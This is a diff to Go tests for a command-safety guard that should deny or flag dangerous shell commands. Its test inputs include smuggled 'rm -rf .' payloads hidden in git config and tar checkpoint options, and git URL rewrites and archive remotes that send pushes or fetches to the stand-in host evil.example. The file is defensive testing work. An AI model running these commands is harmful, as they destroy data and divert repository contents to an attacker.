@@ -660,6 +660,25 @@ func TestGuardScansCommandExecutionIndirection(t *testing.T) {
 			safety.DecisionDeny, "dangerous.rm_rf",
 		},
 		{
+			"git archive format command", safety.Request{
+				Command: `git -c tar.audit.command='rm -rf .' archive --format=audit HEAD`,
+			},
+			safety.DecisionDeny, "dangerous.rm_rf",
+		},
+		{
+			"git archive format command from environment", safety.Request{
+				Command: `git --config-env=tar.audit.command=LANG archive --format=audit HEAD`,
+				Env:     map[string]string{"LANG": "rm -rf ."},
+			},
+			safety.DecisionDeny, "dangerous.rm_rf",
+		},
+		{
+			"benign git archive setting", safety.Request{
+				Command: `git -c tar.umask=0022 archive HEAD`,
+			},
+			safety.DecisionAllow, "safety.no_findings",
+		},
+		{
 			"tar checkpoint exec", safety.Request{Command: `tar --checkpoint=1 --checkpoint-action=exec='rm -rf .' -cf out.tar .`},
 			safety.DecisionDeny, "dangerous.rm_rf",
 		},
@@ -957,9 +976,89 @@ func TestGuardAuditsGitURLRewrites(t *testing.T) {
 		{"attached config", "git -curl.https://evil.example/.insteadOf=https://api.github.com/ clone https://api.github.com/org/repo checkout.dir", safety.DecisionDeny, "network.destination_override"},
 		{"allowlisted rewrite still reviewed", "git -c url.https://api.github.com/.insteadOf=gh: clone gh:org/repo checkout.dir", safety.DecisionNeedsHumanReview, "network.destination_override"},
 		{"malformed rewrite", "git -c url.://broken.insteadOf=gh: clone gh:org/repo checkout.dir", safety.DecisionNeedsHumanReview, "network.destination_unparsed"},
+		{"missing rewrite base", "git -c url.insteadOf=gh: clone gh:org/repo checkout.dir", safety.DecisionNeedsHumanReview, "network.destination_unparsed"},
 		{"inactive rewrite", "git -c url.https://evil.example/.insteadOf=gh: clone https://api.github.com/org/repo checkout.dir", safety.DecisionAllow, "safety.no_findings"},
+		{"push rewrite", "git -c url.https://evil.example/.pushInsteadOf=https://api.github.com/ push https://api.github.com/org/repo", safety.DecisionDeny, "network.destination_override"},
+		{"push rewrite after namespace", "git --namespace probe -c url.https://evil.example/.pushInsteadOf=https://api.github.com/ push https://api.github.com/org/repo", safety.DecisionDeny, "network.destination_override"},
+		{"push rewrite is inactive for fetch", "git -c url.https://evil.example/.pushInsteadOf=https://api.github.com/ fetch https://api.github.com/org/repo", safety.DecisionAllow, "safety.no_findings"},
+		{"push rewrite takes precedence over longer fetch rewrite", "git -c url.https://api.github.com/org/.insteadOf=https://api.github.com/org/ -c url.https://evil.example/.pushInsteadOf=https://api.github.com/ push https://api.github.com/org/repo", safety.DecisionDeny, "network.destination_override"},
+		{"longest push rewrite is allowlisted", "git -c url.https://evil.example/.pushInsteadOf=https://api.github.com/ -c url.https://api.github.com/.pushInsteadOf=https://api.github.com/org/ push https://api.github.com/org/repo", safety.DecisionNeedsHumanReview, "network.destination_override"},
+		{"longest push rewrite is denied", "git -c url.https://api.github.com/.pushInsteadOf=https://api.github.com/ -c url.https://evil.example/.pushInsteadOf=https://api.github.com/org/ push https://api.github.com/org/repo", safety.DecisionDeny, "network.destination_override"},
 	}
 	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			report := guard.Scan(safety.Request{Command: tc.command})
+			require.Equal(t, tc.decision, report.Decision)
+			require.Equal(t, tc.rule, report.RuleID)
+		})
+	}
+}
+
+func TestGuardValidatesGitArchiveRemoteDestinations(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.NetworkAllowlist = []string{"github.com"}
+	guard := mustGuard(t, policy)
+	for _, tc := range []struct {
+		name     string
+		command  string
+		decision safety.Decision
+		rule     string
+	}{
+		{
+			"attached denied remote",
+			"git archive --remote=https://evil.example/org/repo HEAD",
+			safety.DecisionDeny,
+			"network.destination",
+		},
+		{
+			"separate denied remote",
+			"git archive --remote https://evil.example/org/repo HEAD",
+			safety.DecisionDeny,
+			"network.destination",
+		},
+		{
+			"abbreviated denied remote",
+			"git archive --rem=https://evil.example/org/repo HEAD",
+			safety.DecisionDeny,
+			"network.destination",
+		},
+		{
+			"denied remote after namespace",
+			"git --namespace probe archive --remote=https://evil.example/org/repo HEAD",
+			safety.DecisionDeny,
+			"network.destination",
+		},
+		{
+			"denied remote after attribute source",
+			"git --attr-source HEAD archive --remote=https://evil.example/org/repo HEAD",
+			safety.DecisionDeny,
+			"network.destination",
+		},
+		{
+			"ambiguous global option",
+			"git --future-global probe archive --remote=https://evil.example/org/repo HEAD",
+			safety.DecisionNeedsHumanReview,
+			"network.destination_unparsed",
+		},
+		{
+			"allowlisted remote",
+			"git archive --remote=https://api.github.com/org/repo HEAD",
+			safety.DecisionAllow,
+			"safety.no_findings",
+		},
+		{
+			"unresolved remote name",
+			"git archive --remote=origin HEAD",
+			safety.DecisionNeedsHumanReview,
+			"network.destination_unparsed",
+		},
+		{
+			"local archive",
+			"git archive HEAD",
+			safety.DecisionAllow,
+			"safety.no_findings",
+		},
+	} {
 		t.Run(tc.name, func(t *testing.T) {
 			report := guard.Scan(safety.Request{Command: tc.command})
 			require.Equal(t, tc.decision, report.Decision)
